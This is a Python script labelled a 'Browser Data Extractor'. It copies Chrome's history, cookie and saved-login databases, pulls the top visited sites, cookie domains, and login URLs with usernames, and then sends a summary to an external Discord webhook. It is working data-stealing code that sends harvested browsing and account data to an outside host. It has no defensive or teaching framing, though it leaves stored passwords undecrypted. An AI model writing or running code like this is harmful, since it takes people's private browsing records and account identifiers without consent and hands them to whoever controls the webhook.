#!/usr/bin/env python3
"""
Browser Data Extractor
Extracts browser history, cookies, and saved passwords (Chrome/Edge)
"""

import os
import sys
import sqlite3
import shutil
from pathlib import Path
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

def get_chrome_data():
    """Extract Chrome browser data"""
    results = {
        'history': [],
        'cookies': [],
        'logins': []
    }
    
    # Chrome paths
    chrome_path = Path.home() / "AppData/Local/Google/Chrome/User Data/Default"
    
    if not chrome_path.exists():
        return results
    
    # History
    history_db = chrome_path / "History"
    if history_db.exists():
        try:
            # Copy to temp location (Chrome locks the file)
            temp_db = Path("temp_history.db")
            shutil.copy2(history_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time 
                FROM urls 
                ORDER BY visit_count DESC 
                LIMIT 50
            """)
            
            for row in cursor.fetchall():
                results['history'].append({
                    'url': row[0],
                    'title': row[1] or 'No title',
                    'visits': row[2]
                })
            
            conn.close()
            temp_db.unlink()
            
        except Exception as e:
            results['history'].append({'error': str(e)})
    
    # Cookies
    cookies_db = chrome_path / "Network/Cookies"
    if cookies_db.exists():
        try:
            temp_db = Path("temp_cookies.db")
            shutil.copy2(cookies_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT host_key, name, COUNT(*) as count
                FROM cookies 
                GROUP BY host_key 
                ORDER BY count DESC 
                LIMIT 30
            """)
            
            for row in cursor.fetchall():
                results['cookies'].append({
                    'domain': row[0],
                    'count': row[2]
                })
            
            conn.close()
            temp_db.unlink()
            
        except Exception as e:
            results['cookies'].append({'error': str(e)})
    
    # Note: Passwords are encrypted and require decryption key
    # This is a simplified version showing structure only
    login_db = chrome_path / "Login Data"
    if login_db.exists():
        try:
            temp_db = Path("temp_login.db")
            shutil.copy2(login_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT origin_url, username_value 
                FROM logins 
                LIMIT 20
            """)
            
            for row in cursor.fetchall():
                if row[1]:  # If username exists
                    results['logins'].append({
                        'url': row[0],
                        'username': row[1],
                        'note': 'Password encrypted (key required)'
                    })
            
            conn.close()
            temp_db.unlink()
            
        except Exception as e:
            results['logins'].append({'error': str(e)})
    
    return results

def main():
    print("=" * 60)
    print("BROWSER DATA EXTRACTOR")
    print("=" * 60)
    print("\nNote: Close your browser for best results\n")
    
    print("Extracting Chrome/Edge data...")
    data = get_chrome_data()
    
    # Display results
    print(f"\n{'='*60}")
    print("HISTORY")
    print(f"{'='*60}")
    
    if data['history']:
        for i, entry in enumerate(data['history'][:10], 1):
            if 'error' in entry:
                print(f"Error: {entry['error']}")
            else:
                print(f"{i}. {entry['title']}")
                print(f"   {entry['url']}")
                print(f"   Visits: {entry['visits']}\n")
        
        if len(data['history']) > 10:
            print(f"... and {len(data['history']) - 10} more entries\n")
    else:
        print("No history found.\n")
    
    print(f"{'='*60}")
    print("COOKIES")
    print(f"{'='*60}")
    
    if data['cookies']:
        for i, cookie in enumerate(data['cookies'][:10], 1):
            if 'error' in cookie:
                print(f"Error: {cookie['error']}")
            else:
                print(f"{i}. {cookie['domain']} ({cookie['count']} cookies)")
        print()
    else:
        print("No cookies found.\n")
    
    print(f"{'='*60}")
    print("SAVED LOGINS")
    print(f"{'='*60}")
    
    if data['logins']:
        for i, login in enumerate(data['logins'][:10], 1):
            if 'error' in login:
                print(f"Error: {login['error']}")
            else:
                print(f"{i}. {login['url']}")
                print(f"   Username: {login['username']}")
                print(f"   {login['note']}\n")
    else:
        print("No saved logins found.\n")
    
    # Send to Discord
    if WEBHOOK_AVAILABLE:
        print("Sending data to Discord...")
        
        # Format for Discord
        message = "**Browser Data Extraction Report**\n\n"
        
        # History summary
        message += f"📊 **Top Visited Sites** ({len(data['history'])} total)\n"
        for entry in data['history'][:5]:
            if 'error' not in entry:
                message += f"• {entry['title'][:50]} ({entry['visits']} visits)\n"
        message += "\n"
        
        # Cookie summary
        message += f"🍪 **Cookies** ({len(data['cookies'])} domains)\n"
        for cookie in data['cookies'][:5]:
            if 'error' not in cookie:
                message += f"• {cookie['domain']} ({cookie['count']} cookies)\n"
        message += "\n"
        
        # Login summary
        message += f"🔐 **Saved Logins** ({len(data['logins'])} found)\n"
        for login in data['logins'][:5]:
            if 'error' not in login:
                message += f"• {login['url'][:40]}\n  └ {login['username']}\n"
        
        success = send_to_discord("Browser Data Extracted", message)
        
        if success:
            print("✓ Data sent to Discord")
        else:
            print("✗ Failed to send to Discord")
    
    print("=" * 60)

if __name__ == "__main__":
    main()
